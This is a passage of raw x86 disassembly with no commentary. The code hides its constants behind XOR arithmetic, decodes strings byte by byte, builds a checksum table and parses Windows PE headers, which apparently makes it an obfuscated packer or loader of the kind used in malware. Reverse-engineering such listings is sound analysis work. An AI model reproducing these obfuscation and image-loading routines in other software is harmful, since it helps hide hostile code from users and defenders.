  427039:	add    eax,0x3b5e
  42703e:	mov    WORD PTR [ecx],ax
  427041:	add    ecx,0x2
  427044:	add    edx,0x2
  427047:	movzx  eax,WORD PTR [edx]
  42704a:	mov    ebx,0x4e3e
  42704f:	cmp    ax,bx
  427052:	jne    0x427034
  427054:	xor    eax,eax
  427056:	mov    WORD PTR [ecx],ax
  427059:	mov    eax,DWORD PTR [edi+0x188]
  42705f:	pop    ebx
  427060:	ret    
  427061:	push   edi
  427062:	mov    edi,eax
  427064:	mov    eax,DWORD PTR [esi+0x188]
  42706a:	shl    edi,0x6
  42706d:	add    eax,edi
  42706f:	jmp    0x42707b
  427071:	xor    cl,0x80
  427074:	add    cl,0x5
  427077:	mov    BYTE PTR [eax],cl
  427079:	inc    eax
  42707a:	inc    edx
  42707b:	mov    cl,BYTE PTR [edx]
  42707d:	cmp    cl,0x7b
  427080:	jne    0x427071
  427082:	mov    BYTE PTR [eax],0x0
  427085:	mov    eax,DWORD PTR [esi+0x188]
  42708b:	add    eax,edi
  42708d:	pop    edi
  42708e:	ret    
  42708f:	push   ebp
  427090:	mov    ebp,esp
  427092:	sub    esp,0x14
  427095:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  42709c:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  4270a3:	mov    eax,DWORD PTR [ebx]
  4270a5:	mov    DWORD PTR [ebp-0x8],eax
  4270a8:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  4270af:	push   esi
  4270b0:	push   edi
  4270b1:	mov    DWORD PTR [ebp-0x14],0xead71899
  4270b8:	mov    edi,DWORD PTR [ebp-0x4]
  4270bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4270be:	mov    eax,0x75108b1
  4270c3:	xor    edi,eax
  4270c5:	mov    edx,0x3272f8
  4270ca:	xor    ecx,eax
  4270cc:	add    edi,edx
  4270ce:	add    ecx,edx
  4270d0:	imul   edi,ecx
  4270d3:	jmp    0x42711b
  4270d5:	mov    ecx,DWORD PTR [ebp-0x8]
  4270d8:	mov    esi,DWORD PTR [ebp-0x4]
  4270db:	xor    ecx,eax
  4270dd:	xor    esi,eax
  4270df:	add    ecx,edx
  4270e1:	add    esi,edx
  4270e3:	test   esi,ecx
  4270e5:	mov    esi,DWORD PTR [ebp-0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0x4]
  4270eb:	je     0x427102
  4270ed:	xor    ecx,eax
  4270ef:	xor    esi,eax
  4270f1:	add    ecx,edx
  4270f3:	add    esi,edx
  4270f5:	shr    esi,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x14]
  4270fa:	xor    ecx,eax
  4270fc:	add    ecx,edx
  4270fe:	xor    esi,ecx
  427100:	jmp    0x42710c
  427102:	xor    esi,eax
  427104:	xor    ecx,eax
  427106:	add    esi,edx
  427108:	add    ecx,edx
  42710a:	shr    esi,cl
  42710c:	mov    DWORD PTR [ebp-0x8],esi
  42710f:	mov    ecx,DWORD PTR [ebp-0x4]
  427112:	xor    ecx,eax
  427114:	lea    edi,[edi+ecx*1+0x3272f8]
  42711b:	mov    ecx,DWORD PTR [ebp-0xc]
  42711e:	mov    esi,DWORD PTR [ebp-0x4]
  427121:	xor    esi,eax
  427123:	xor    ecx,eax
  427125:	sub    ecx,esi
  427127:	cmp    edi,ecx
  427129:	jbe    0x4270d5
  42712b:	mov    eax,DWORD PTR [ebp-0x8]
  42712e:	pop    edi
  42712f:	mov    DWORD PTR [ebx],eax
  427131:	mov    eax,DWORD PTR [ebp-0x8]
  427134:	pop    esi
  427135:	leave  
  427136:	ret    
  427137:	push   ebp
  427138:	mov    ebp,esp
  42713a:	sub    esp,0x38
  42713d:	push   ebx
  42713e:	mov    ebx,0xf89c85b9
  427143:	mov    DWORD PTR [ebp-0x4],ebx
  427146:	lea    ecx,[ebx-0x1]
  427149:	mov    DWORD PTR [ebp-0x24],ecx
  42714c:	mov    eax,DWORD PTR [ebp-0x4]
  42714f:	mov    edx,DWORD PTR [ebp+0x8]
  427152:	push   esi
  427153:	mov    esi,0x75108b1
  427158:	xor    eax,esi
  42715a:	push   edi
  42715b:	mov    edi,0x3272f8
  427160:	add    eax,edi
  427162:	cmp    edx,eax
  427164:	mov    eax,DWORD PTR [ebp-0x4]
  427167:	je     0x4272cc
  42716d:	mov    edx,DWORD PTR [ebp+0xc]
  427170:	xor    eax,esi
  427172:	add    eax,edi
  427174:	cmp    edx,eax
  427176:	je     0x4272c9
  42717c:	mov    eax,DWORD PTR [ebp+0x10]
  42717f:	mov    edx,DWORD PTR [ebp+0xc]
  427182:	mov    DWORD PTR [ebp-0x14],eax
  427185:	mov    eax,DWORD PTR [ebp+0x8]
  427188:	mov    DWORD PTR [ebp-0x18],0xf89c8523
  42718f:	mov    DWORD PTR [ebp-0xc],eax
  427192:	lea    eax,[ebx+0x2]
  427195:	mov    DWORD PTR [ebp-0x1c],eax
  427198:	mov    DWORD PTR [ebp-0x10],ebx
  42719b:	mov    DWORD PTR [ebp+0xc],ecx
  42719e:	mov    DWORD PTR [ebp+0x10],eax
  4271a1:	mov    eax,DWORD PTR [ebp+0xc]
  4271a4:	xor    eax,esi
  4271a6:	mov    DWORD PTR [ebp-0x20],edx
  4271a9:	sub    edx,eax
  4271ab:	sub    edx,edi
  4271ad:	mov    DWORD PTR [ebp+0x8],edx
  4271b0:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  4271b7:	jmp    0x4272b9
  4271bc:	mov    eax,DWORD PTR [ebp+0xc]
  4271bf:	mov    ecx,DWORD PTR [ebp+0xc]
  4271c2:	xor    eax,esi
  4271c4:	xor    ecx,esi
  4271c6:	lea    ecx,[eax+ecx*1+0x64e5f0]
  4271cd:	mov    eax,DWORD PTR [ebp+0x8]
  4271d0:	xor    edx,edx
  4271d2:	div    ecx
  4271d4:	mov    eax,DWORD PTR [ebp+0x10]
  4271d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4271da:	xor    eax,esi
  4271dc:	xor    ecx,esi
  4271de:	sub    eax,ecx
  4271e0:	cmp    edx,eax
  4271e2:	jne    0x427278
  4271e8:	mov    eax,DWORD PTR [ebp+0x8]
  4271eb:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ee:	mov    dl,BYTE PTR [eax+ecx*1]
  4271f1:	mov    eax,DWORD PTR [ebp-0x10]
  4271f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4271f7:	xor    eax,esi
  4271f9:	xor    ecx,esi
  4271fb:	add    eax,edi
  4271fd:	add    ecx,edi
  4271ff:	cmp    eax,ecx
  427201:	jae    0x427249
  427203:	lea    ecx,[eax-0x3272f8]
  427209:	mov    DWORD PTR [ebp-0x4],ecx
  42720c:	mov    ebx,DWORD PTR [ebp-0x4]
  42720f:	xor    ebx,esi
  427211:	add    ebx,0x7f55d8fb
  427217:	lea    ecx,[ebp+eax*4-0x38]
  42721b:	mov    DWORD PTR [ecx],ebx
  42721d:	mov    ebx,DWORD PTR [ecx]
  42721f:	cmp    ebx,0x244ecb9a
  427225:	jbe    0x42722f
  427227:	add    DWORD PTR [ecx],0x405fcdd
  42722d:	jmp    0x427235
  42722f:	add    DWORD PTR [ecx],0xfdaf4323
  427235:	mov    ecx,DWORD PTR [ebp-0x8]
  427238:	xor    ecx,esi
  42723a:	inc    eax
  42723b:	inc    DWORD PTR [ebp-0x4]
  42723e:	add    ecx,edi
  427240:	cmp    eax,ecx
  427242:	jb     0x42720c
  427244:	mov    ebx,0xf89c85b9
  427249:	cmp    DWORD PTR [ebp-0x14],0x0
  42724d:	jne    0x427257
  42724f:	xor    dl,0x80
  427252:	add    dl,0x5
  427255:	jmp    0x42726d
  427257:	mov    eax,DWORD PTR [ebp-0x18]
  42725a:	xor    al,0xb1
  42725c:	mov    cl,0x8
  42725e:	sub    cl,al
  427260:	add    dl,cl
  427262:	mov    ecx,DWORD PTR [ebp-0x1c]
  427265:	xor    cl,0xb1
  427268:	sub    cl,0x8
  42726b:	ror    dl,cl
  42726d:	xor    eax,eax
  42726f:	mov    eax,DWORD PTR [ebp+0x8]
  427272:	mov    ecx,DWORD PTR [ebp-0xc]
  427275:	mov    BYTE PTR [eax+ecx*1],dl
  427278:	mov    eax,DWORD PTR [ebp+0x8]
  42727b:	mov    ecx,DWORD PTR [ebp-0x10]
  42727e:	sub    eax,edi
  427280:	xor    eax,esi
  427282:	cmp    eax,ecx
  427284:	jne    0x4272a7
  427286:	mov    eax,DWORD PTR [ebp+0x10]
  427289:	mov    ecx,DWORD PTR [ebp+0xc]
  42728c:	xor    eax,esi
  42728e:	xor    ecx,esi
  427290:	sub    eax,ecx
  427292:	mov    ecx,DWORD PTR [ebp-0x20]
  427295:	sub    eax,edi
  427297:	xor    eax,esi
  427299:	mov    DWORD PTR [ebp+0x10],eax
  42729c:	mov    eax,DWORD PTR [ebp+0xc]
  42729f:	xor    eax,esi
  4272a1:	sub    ecx,eax
  4272a3:	sub    ecx,edi
  4272a5:	jmp    0x4272b6
  4272a7:	mov    eax,DWORD PTR [ebp+0xc]
  4272aa:	xor    eax,esi
  4272ac:	mov    ecx,0xffcd8d08
  4272b1:	sub    ecx,eax
  4272b3:	add    ecx,DWORD PTR [ebp+0x8]
  4272b6:	mov    DWORD PTR [ebp+0x8],ecx
  4272b9:	mov    eax,DWORD PTR [ebp+0x10]
  4272bc:	cmp    eax,ebx
  4272be:	jne    0x4271bc
  4272c4:	mov    eax,DWORD PTR [ebp-0x24]
  4272c7:	jmp    0x4272cc
  4272c9:	mov    eax,DWORD PTR [ebp-0x4]
  4272cc:	xor    eax,esi
  4272ce:	add    eax,edi
  4272d0:	pop    edi
  4272d1:	pop    esi
  4272d2:	pop    ebx
  4272d3:	leave  
  4272d4:	ret    0xc
  4272d7:	push   ebp
  4272d8:	mov    ebp,esp
  4272da:	sub    esp,0x420
  4272e0:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  4272e7:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4272ee:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  4272f5:	push   ebx
  4272f6:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  4272fd:	mov    eax,DWORD PTR [ebp-0x14]
  427300:	push   esi
  427301:	mov    esi,0x75108b1
  427306:	push   edi
  427307:	xor    eax,esi
  427309:	mov    edi,0x3272f8
  42730e:	add    eax,edi
  427310:	mov    DWORD PTR [ebp-0x8],eax
  427313:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  42731a:	mov    DWORD PTR [ebp-0x4],0xead71899
  427321:	mov    DWORD PTR [ebp-0x10],0x8
  427328:	mov    ecx,ecx
  42732a:	mov    eax,DWORD PTR [ebp-0xc]
  42732d:	mov    ecx,DWORD PTR [ebp-0x14]
  427330:	xor    eax,esi
  427332:	xor    ecx,esi
  427334:	add    eax,edi
  427336:	add    ecx,edi
  427338:	imul   eax,ecx
  42733b:	jmp    0x42736e
  42733d:	mov    eax,DWORD PTR [ebp-0x4]
  427340:	sub    eax,edi
  427342:	xor    eax,esi
  427344:	mov    DWORD PTR [ebp-0x8],eax
  427347:	lea    ebx,[ebp-0x8]
  42734a:	call   0x42708f
  42734f:	mov    DWORD PTR [ebp-0x8],eax
  427352:	mov    eax,DWORD PTR [ebp-0x8]
  427355:	mov    ecx,DWORD PTR [ebp-0x4]
  427358:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42735f:	mov    eax,DWORD PTR [ebp-0xc]
  427362:	mov    ecx,DWORD PTR [ebp-0x4]
  427365:	xor    eax,esi
  427367:	lea    eax,[eax+ecx*1+0x3272f8]
  42736e:	mov    DWORD PTR [ebp-0x4],eax
  427371:	mov    eax,DWORD PTR [ebp-0x18]
  427374:	mov    ecx,DWORD PTR [ebp-0xc]
  427377:	xor    ecx,esi
  427379:	xor    eax,esi
  42737b:	sub    eax,ecx
  42737d:	mov    ecx,DWORD PTR [ebp-0x4]
  427380:	cmp    ecx,eax
  427382:	jbe    0x42733d
  427384:	mov    eax,DWORD PTR [ebp-0x1c]
  427387:	xor    eax,esi
  427389:	add    eax,edi
  42738b:	mov    DWORD PTR [ebp-0x8],eax
  42738e:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  427395:	mov    ebx,ebx
  427397:	jmp    0x4273fa
  427399:	mov    ecx,DWORD PTR [ebp-0x20]
  42739c:	mov    eax,DWORD PTR [ebp-0x8]
  42739f:	xor    ecx,esi
  4273a1:	add    ecx,edi
  4273a3:	shr    eax,cl
  4273a5:	mov    DWORD PTR [ebp-0x4],eax
  4273a8:	mov    eax,DWORD PTR [ebp+0x8]
  4273ab:	mov    cl,BYTE PTR [eax]
  4273ad:	mov    BYTE PTR [ebp+0xb],cl
  4273b0:	mov    cl,BYTE PTR [ebp+0xb]
  4273b3:	mov    edx,DWORD PTR [ebp-0x8]
  4273b6:	movzx  ecx,cl
  4273b9:	xor    ecx,edx
  4273bb:	mov    DWORD PTR [ebp+0x8],ecx
  4273be:	mov    ecx,DWORD PTR [ebp-0x18]
  4273c1:	mov    edx,DWORD PTR [ebp+0x8]
  4273c4:	xor    ecx,esi
  4273c6:	add    ecx,edi
  4273c8:	and    ecx,edx
  4273ca:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  4273d1:	mov    edx,DWORD PTR [ebp-0x4]
  4273d4:	xor    ecx,edx
  4273d6:	mov    DWORD PTR [ebp-0x8],ecx
  4273d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4273dc:	xor    ecx,esi
  4273de:	lea    eax,[eax+ecx*1+0x3272f8]
  4273e5:	mov    DWORD PTR [ebp+0x8],eax
  4273e8:	mov    eax,DWORD PTR [ebp-0xc]
  4273eb:	xor    eax,esi
  4273ed:	mov    ecx,0xffcd8d08
  4273f2:	sub    ecx,eax
  4273f4:	add    ecx,DWORD PTR [ebp-0x10]
  4273f7:	mov    DWORD PTR [ebp-0x10],ecx
  4273fa:	mov    eax,DWORD PTR [ebp-0x14]
  4273fd:	mov    ecx,DWORD PTR [ebp-0x10]
  427400:	xor    eax,esi
  427402:	add    eax,edi
  427404:	cmp    ecx,eax
  427406:	jne    0x427399
  427408:	mov    eax,DWORD PTR [ebp-0x1c]
  42740b:	mov    ecx,DWORD PTR [ebp-0x8]
  42740e:	xor    eax,esi
  427410:	add    eax,edi
  427412:	pop    edi
  427413:	pop    esi
  427414:	xor    eax,ecx
  427416:	pop    ebx
  427417:	leave  
  427418:	ret    0x4
  42741b:	push   ebp
  42741c:	mov    ebp,esp
  42741e:	mov    eax,DWORD PTR [ebp+0x1c]
  427421:	mov    ecx,DWORD PTR [ebp+0x8]
  427424:	mov    edx,DWORD PTR [ebp+0x10]
  427427:	mov    eax,DWORD PTR [eax+0x190]
  42742d:	mov    eax,DWORD PTR [eax]
  42742f:	sub    esp,0x64
  427432:	push   ebx
  427433:	push   esi
  427434:	push   edi
  427435:	mov    edi,0x75108b1
  42743a:	xor    ecx,edi
  42743c:	mov    ebx,0x3272f8
  427441:	add    ecx,ebx
  427443:	cmp    ecx,edx
  427445:	jne    0x427456
  427447:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  427451:	jmp    0x427952
  427456:	mov    ecx,DWORD PTR [ebp+0x8]
  427459:	mov    esi,DWORD PTR [ebp+0x14]
  42745c:	mov    edx,DWORD PTR [esi]
  42745e:	xor    ecx,edi
  427460:	add    ecx,ebx
  427462:	cmp    edx,ecx
  427464:	je     0x42790d
  42746a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42746d:	mov    DWORD PTR [ebp-0x1c],eax
  427470:	mov    DWORD PTR [ebp+0x1c],ecx
  427473:	mov    ecx,DWORD PTR [ebp+0x18]
  427476:	mov    eax,DWORD PTR [esi]
  427478:	mov    DWORD PTR [ebp-0x20],eax
  42747b:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  427482:	mov    edx,0xf89c85b8
  427487:	mov    DWORD PTR [ebp-0x8],edx
  42748a:	mov    eax,DWORD PTR [ebp+0x1c]
  42748d:	mov    DWORD PTR [ebp+0x1c],eax
  427490:	mov    eax,DWORD PTR [ebp+0x1c]
  427493:	mov    eax,DWORD PTR [eax+0x190]
  427499:	mov    eax,DWORD PTR [eax]
  42749b:	mov    DWORD PTR [ebp-0x24],ecx
  42749e:	mov    ecx,DWORD PTR [ebp+0x1c]
  4274a1:	mov    ecx,DWORD PTR [ecx+0x190]
  4274a7:	mov    ecx,DWORD PTR [ecx]
  4274a9:	add    ecx,DWORD PTR [eax+0x3c]
  4274ac:	mov    DWORD PTR [ebp+0x10],ecx
  4274af:	mov    eax,DWORD PTR [ebp+0x8]
  4274b2:	xor    eax,edi
  4274b4:	add    eax,ebx
  4274b6:	mov    DWORD PTR [ebp-0x4],eax
  4274b9:	mov    eax,DWORD PTR [ebp+0x8]
  4274bc:	xor    eax,edi
  4274be:	add    eax,ebx
  4274c0:	mov    DWORD PTR [ebp+0x18],eax
  4274c3:	mov    eax,DWORD PTR [ebp+0x10]
  4274c6:	mov    eax,DWORD PTR [eax+0x50]
  4274c9:	sub    eax,0xc
  4274cc:	mov    DWORD PTR [ebp-0x28],eax
  4274cf:	mov    eax,DWORD PTR [ebp+0x10]
  4274d2:	mov    eax,DWORD PTR [eax+0x38]
  4274d5:	mov    ecx,DWORD PTR [ebp+0x10]
  4274d8:	dec    eax
  4274d9:	test   DWORD PTR [ecx+0x54],eax
  4274dc:	mov    eax,DWORD PTR [ebp+0x10]
  4274df:	je     0x4274f9
  4274e1:	mov    eax,DWORD PTR [eax+0x38]
  4274e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4274e7:	mov    ecx,DWORD PTR [ecx+0x54]
  4274ea:	dec    eax
  4274eb:	not    eax
  4274ed:	and    ecx,eax
  4274ef:	mov    eax,DWORD PTR [ebp+0x10]
  4274f2:	mov    eax,DWORD PTR [eax+0x38]
  4274f5:	add    eax,ecx
  4274f7:	jmp    0x4274fc
  4274f9:	mov    eax,DWORD PTR [eax+0x54]
  4274fc:	mov    DWORD PTR [ebp+0x1c],eax
  4274ff:	mov    eax,DWORD PTR [ebp+0x8]
  427502:	xor    eax,edi
  427504:	add    eax,ebx
  427506:	mov    DWORD PTR [ebp+0x18],eax
  427509:	mov    eax,DWORD PTR [ebp+0x8]
  42750c:	xor    eax,edi
  42750e:	add    eax,ebx
  427510:	mov    DWORD PTR [ebp+0x18],eax
  427513:	mov    eax,DWORD PTR [ebp+0x8]
  427516:	mov    ecx,DWORD PTR [ebp-0x24]
  427519:	xor    eax,edi
  42751b:	add    eax,ebx
  42751d:	mov    DWORD PTR [ecx],eax
  42751f:	mov    DWORD PTR [ebp+0x18],edx
  427522:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  427529:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  427530:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  427537:	mov    eax,DWORD PTR [ebp-0x8]
  42753a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42753d:	xor    eax,edi
  42753f:	add    eax,ebx
  427541:	imul   eax,ecx
  427544:	mov    ecx,DWORD PTR [ebp+0x8]
  427547:	mov    edx,DWORD PTR [ebp-0x28]
  42754a:	xor    ecx,edi
  42754c:	lea    ecx,[ecx+edx*1+0x3272f8]
  427553:	cmp    eax,ecx
  427555:	jae    0x427906
  42755b:	mov    eax,DWORD PTR [ebp+0x8]
  42755e:	xor    eax,edi
  427560:	add    eax,ebx
  427562:	mov    DWORD PTR [ebp+0x18],eax
  427565:	mov    eax,DWORD PTR [ebp+0x1c]
  427568:	add    eax,DWORD PTR [ebp-0x1c]
  42756b:	mov    DWORD PTR [ebp-0x4],eax
  42756e:	push   DWORD PTR [ebp-0x4]
  427571:	mov    esi,DWORD PTR [ebp-0x1c]
  427574:	mov    ecx,DWORD PTR [ebp+0x10]
  427577:	call   0x4266c7
  42757c:	mov    DWORD PTR [ebp+0xc],eax
  42757f:	mov    DWORD PTR [ebp-0x18],0xf89c85a1
  427586:	mov    eax,DWORD PTR [ebp-0x18]
  427589:	xor    eax,edi
  42758b:	lea    ecx,[ebp-0x40]
  42758e:	add    eax,ebx
  427590:	push   ecx
  427591:	call   0x426c5b
  427596:	mov    eax,DWORD PTR [ebp+0xc]
  427599:	test   eax,eax
  42759b:	je     0x4275eb
  42759d:	mov    eax,DWORD PTR [ebp-0x18]
  4275a0:	xor    eax,edi
  4275a2:	add    eax,ebx
  4275a4:	push   eax
  4275a5:	push   DWORD PTR [ebp+0xc]
  4275a8:	lea    eax,[ebp-0x40]
  4275ab:	push   eax
  4275ac:	call   0x426b51
  4275b1:	mov    eax,DWORD PTR [ebp-0x4]
  4275b4:	mov    DWORD PTR [ebp-0x18],eax
  4275b7:	mov    eax,DWORD PTR [ebp-0x18]
  4275ba:	mov    ecx,DWORD PTR [ebp-0x1c]
  4275bd:	sub    eax,ecx
  4275bf:	mov    DWORD PTR [ebp-0x18],eax
  4275c2:	mov    eax,DWORD PTR [ebp+0xc]
  4275c5:	mov    ecx,DWORD PTR [ebp+0xc]
  4275c8:	mov    eax,DWORD PTR [eax+0x10]
  4275cb:	add    eax,DWORD PTR [ecx+0xc]
  4275ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4275d1:	cmp    ecx,eax
  4275d3:	jb     0x4275eb
  4275d5:	mov    eax,DWORD PTR [ebp+0xc]
  4275d8:	mov    eax,DWORD PTR [eax+0xc]
  4275db:	mov    ecx,DWORD PTR [ebp+0xc]
  4275de:	add    eax,DWORD PTR [ecx+0x8]
  4275e1:	mov    ecx,DWORD PTR [ebp-0x18]
  4275e4:	sub    eax,ecx
  4275e6:	jmp    0x4278d9
  4275eb:	push   0xc
  4275ed:	push   DWORD PTR [ebp-0x4]
  4275f0:	lea    eax,[ebp-0x4c]
  4275f3:	push   eax
  4275f4:	call   0x426b51
  4275f9:	mov    eax,0xf89c85b9
  4275fe:	mov    DWORD PTR [ebp-0x2c],eax
  427601:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  427608:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  42760f:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  427616:	lea    ecx,[ebp-0x2c]
  427619:	mov    DWORD PTR [ebp-0xc],ecx
  42761c:	lea    ecx,[ebp-0x30]
  42761f:	mov    DWORD PTR [ebp-0x10],ecx
  427622:	lea    ecx,[ebp-0x34]
  427625:	mov    DWORD PTR [ebp+0xc],ecx
  427628:	lea    ecx,[ebp-0x38]
  42762b:	mov    DWORD PTR [ebp-0x14],ecx
  42762e:	mov    ecx,DWORD PTR [ebp+0x8]
  427631:	xor    ecx,edi
  427633:	add    ecx,ebx
  427635:	mov    DWORD PTR [ebp-0x18],ecx
  427638:	jmp    0x427834
  42763d:	cmp    eax,0xf89c85bb
  427642:	je     0x427846
  427648:	mov    ecx,DWORD PTR [ebp-0x8]
  42764b:	xor    ecx,edi
  42764d:	mov    esi,eax
  42764f:	add    ecx,ebx
  427651:	mov    DWORD PTR [ebp+0x18],ecx
  427654:	mov    eax,DWORD PTR [ebp-0x18]
  427657:	xor    esi,edi
  427659:	lea    eax,[eax+esi*1+0x3272f8]
  427660:	mov    DWORD PTR [ebp-0x18],eax
  427663:	mov    eax,DWORD PTR [ebp-0x8]
  427666:	mov    ecx,DWORD PTR [ebp-0x18]
  427669:	xor    eax,edi
  42766b:	add    eax,ebx
  42766d:	cmp    ecx,eax
  42766f:	jne    0x427684
  427671:	mov    eax,DWORD PTR [ebp+0x8]
  427674:	xor    eax,edi
  427676:	add    eax,ebx
  427678:	push   eax
  427679:	push   0xc
  42767b:	lea    eax,[ebp-0x4c]
  42767e:	push   eax
  42767f:	call   0x427137
  427684:	mov    eax,DWORD PTR [ebp-0xc]
  427687:	mov    eax,DWORD PTR [eax]
  427689:	xor    eax,edi
  42768b:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427692:	mov    ecx,DWORD PTR [ebp+0x8]
  427695:	xor    ecx,edi
  427697:	movzx  eax,al
  42769a:	add    ecx,ebx
  42769c:	cmp    eax,ecx
  42769e:	je     0x42781c
  4276a4:	mov    eax,DWORD PTR [ebp-0x10]
  4276a7:	mov    eax,DWORD PTR [eax]
  4276a9:	xor    eax,edi
  4276ab:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276b2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276b5:	xor    ecx,edi
  4276b7:	movzx  eax,al
  4276ba:	add    ecx,ebx
  4276bc:	cmp    eax,ecx
  4276be:	je     0x42781c
  4276c4:	mov    eax,DWORD PTR [ebp+0xc]
  4276c7:	mov    eax,DWORD PTR [eax]
  4276c9:	xor    eax,edi
  4276cb:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276d2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276d5:	xor    ecx,edi
  4276d7:	movzx  eax,al
  4276da:	add    ecx,ebx
  4276dc:	cmp    eax,ecx
  4276de:	je     0x42781c
  4276e4:	mov    eax,DWORD PTR [ebp-0x14]
  4276e7:	mov    eax,DWORD PTR [eax]
  4276e9:	xor    eax,edi
  4276eb:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276f5:	xor    ecx,edi
  4276f7:	movzx  eax,al
  4276fa:	add    ecx,ebx
  4276fc:	cmp    eax,ecx
  4276fe:	je     0x42781c
  427704:	mov    eax,DWORD PTR [ebp-0x10]
  427707:	mov    eax,DWORD PTR [eax]
  427709:	xor    eax,edi
  42770b:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427712:	mov    ecx,DWORD PTR [ebp-0xc]
  427715:	mov    ecx,DWORD PTR [ecx]
  427717:	xor    ecx,edi
  427719:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427720:	xor    al,cl
  427722:	mov    ecx,DWORD PTR [ebp+0xc]
  427725:	mov    ecx,DWORD PTR [ecx]
  427727:	xor    ecx,edi
  427729:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427730:	or     al,cl
  427732:	mov    ecx,DWORD PTR [ebp-0xc]
  427735:	mov    ecx,DWORD PTR [ecx]
  427737:	xor    ecx,edi
  427739:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427740:	cmp    cl,al
  427742:	jne    0x42781c
  427748:	mov    eax,DWORD PTR [ebp+0xc]
  42774b:	mov    eax,DWORD PTR [eax]
  42774d:	xor    eax,edi
  42774f:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427756:	mov    ecx,DWORD PTR [ebp-0x10]
  427759:	mov    ecx,DWORD PTR [ecx]
  42775b:	xor    ecx,edi
  42775d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427764:	xor    al,cl
  427766:	mov    ecx,DWORD PTR [ebp-0x14]
  427769:	mov    ecx,DWORD PTR [ecx]
  42776b:	xor    ecx,edi
  42776d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427774:	or     al,cl
  427776:	mov    ecx,DWORD PTR [ebp-0x10]
  427779:	mov    ecx,DWORD PTR [ecx]
  42777b:	xor    ecx,edi
  42777d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427784:	cmp    cl,al
  427786:	jne    0x42781c
  42778c:	mov    eax,DWORD PTR [ebp-0x14]
  42778f:	mov    eax,DWORD PTR [eax]
  427791:	xor    eax,edi
  427793:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  42779a:	mov    ecx,DWORD PTR [ebp+0xc]
  42779d:	mov    ecx,DWORD PTR [ecx]
  42779f:	xor    ecx,edi
  4277a1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277a8:	xor    al,cl
  4277aa:	mov    ecx,DWORD PTR [ebp-0xc]
  4277ad:	mov    ecx,DWORD PTR [ecx]
  4277af:	xor    ecx,edi
  4277b1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277b8:	or     al,cl
  4277ba:	mov    ecx,DWORD PTR [ebp+0xc]
  4277bd:	mov    ecx,DWORD PTR [ecx]
  4277bf:	xor    ecx,edi
  4277c1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  4277c8:	cmp    cl,al
  4277ca:	jne    0x42781c
  4277cc:	mov    eax,DWORD PTR [ebp-0x14]
  4277cf:	mov    eax,DWORD PTR [eax]
  4277d1:	xor    eax,edi
  4277d3:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4277da:	mov    ecx,DWORD PTR [ebp-0xc]
  4277dd:	mov    ecx,DWORD PTR [ecx]
  4277df:	xor    ecx,edi
  4277e1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277e8:	xor    al,cl
  4277ea:	mov    ecx,DWORD PTR [ebp-0x10]
  4277ed:	mov    ecx,DWORD PTR [ecx]
  4277ef:	xor    ecx,edi
  4277f1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277f8:	or     al,cl
  4277fa:	mov    ecx,DWORD PTR [ebp-0x14]
  4277fd:	mov    ecx,DWORD PTR [ecx]
  4277ff:	xor    ecx,edi
  427801:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427808:	cmp    cl,al
  42780a:	jne    0x42781c
  42780c:	lea    eax,[ebp-0x4c]
  42780f:	push   eax
  427810:	call   0x4272d7
  427815:	mov    ecx,DWORD PTR [ebp-0x44]
  427818:	cmp    eax,ecx
  42781a:	je     0x427826
  42781c:	mov    eax,DWORD PTR [ebp+0x8]
  42781f:	xor    eax,edi
  427821:	add    eax,ebx
  427823:	mov    DWORD PTR [ebp+0x18],eax
  427826:	mov    eax,DWORD PTR [ebp-0x8]
  427829:	xor    eax,edi
